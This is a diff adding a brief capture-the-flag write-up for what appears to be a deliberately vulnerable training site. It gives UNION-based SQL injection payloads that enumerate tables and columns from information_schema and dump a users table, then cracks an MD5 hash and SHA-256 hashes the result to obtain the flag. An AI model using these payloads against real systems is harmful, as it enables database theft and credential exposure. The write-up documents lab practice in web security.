@@ -1,0 +1,13 @@
+How To Replicate:
+
+1. Click on the 'Members' button.
+2. Enter '1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()'.
+3. This returns information that tells us the table name (users).
+4. Enter '1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()'.
+5. This returns information that tells us the column names (user_id, first_name, last_name, town, country, planet, Commentaire, countersign).
+6. Enter '1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users' and it returns information including
+    'ID: 1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users 
+    First name: 
+    Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28'
+6. We can decrypt '5ff9d0165b4f92b14994e5c685cdce28' using MD5 to get the word the word 'FourtyTwo'.
+7. We then can hash the lowercased word 'fourtytwo' using sha256 to receive the flag. (10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5)
